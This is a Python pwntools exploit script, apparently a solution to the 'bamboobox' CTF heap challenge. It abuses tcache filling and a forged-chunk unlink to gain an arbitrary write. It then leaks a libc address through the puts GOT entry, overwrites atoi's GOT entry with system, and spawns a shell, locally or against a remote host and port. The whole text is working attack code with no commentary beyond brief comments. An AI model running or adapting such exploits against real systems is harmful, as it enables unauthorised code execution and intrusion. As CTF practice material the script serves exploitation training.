from pwn import *
context(os='linux', arch='i386', kernel='amd64')

fname = args.FNAME if args.FNAME else './bamboobox'
libname = args.LIB if args.LIB else '/lib/x86_64-linux-gnu/libc.so.6'
ldname = args.LDSO if args.LDSO else '/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2'
exe = ELF(fname)
libc = ELF(libname)
ldso = ELF(ldname)
context.binary = exe

if args.REMOTE:
    host, port = args.REMOTE.split(':')
    io = remote(host, int(port))
elif args.LDSO:
    io = process([ldname, fname], env={'LD_PRELOAD': libname})
elif args.LIB:
    io = process(fname, env={'LD_PRELOAD': libname})
else:
    io = process(fname)

def bpt():
    if not args.REMOTE:
        gdb.attach(io)
    pause()

s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil

def opt(idx):
    sa(b'Your choice:', str(idx).encode())

def create(nameLen, name):
    opt(2)
    sa(b'name:', str(nameLen).encode())
    sa(b'item:', name)

def edit(idx, nameLen, name):
    opt(3)
    sa(b'index of item:', str(idx).encode())
    sa(b'name:', str(nameLen).encode())
    sa(b'item:', name)

def show():
    opt(1)

def delete(idx):
    opt(4)
    sa(b'index of item:', str(idx).encode())

def exp():
    addr_magic = 0x400D49 
    addr_global_tbl = 0x6020C0

    for i in range(7):
        create(0x1f8, str(i).encode())

    create(0x1f8, b'7')
    create(0x1f8, b'8')
    create(0x1f8, b'9')
    create(0x20, b'10. guard')

    # fulfill tcache
    for i in range(7):
        delete(i)

    fake_chunk_ptr = addr_global_tbl + 8*0x10 + 8
    payload_unlink = flat({
        0x8:    0x1f1,
        0x10:   fake_chunk_ptr - 0x18,
        0x18:   fake_chunk_ptr - 0x10,
        0x1f0:  0x1f0   # nextchunk.prev_size
    })
    # forge a fake chunk at chunk8, and clear the chunk9.prev_in_use_bit
    edit(8, len(payload_unlink), payload_unlink)
    delete(9)   # consolidate backward to unlink.

    # now the *fake_chunk_ptr = fake_chunk_ptr - 0x18
    def write_to(addr, val):
        payload_write = flat({
            0x0:    0x1f8,
            0x8:   addr,
        })
        edit(8, len(payload_write), payload_write)
        edit(7, 0x10, p64(val))

    # leak
    write_to(addr_global_tbl+8, exe.got.puts)
    show()
    ru(b' : ')
    puts_addr = u64(r(6).ljust(8, b'\x00'))
    libc.address = puts_addr - libc.sym.puts
    log.success('libc: %#x' % libc.address)

    write_to(exe.got.atoi, libc.sym.system)
    sa(b'Your choice:', b'/bin/sh\0')

if '__main__' == __name__:
    if args.DEBUG:
        context.log_level='debug'
    exp()
    io.interactive()    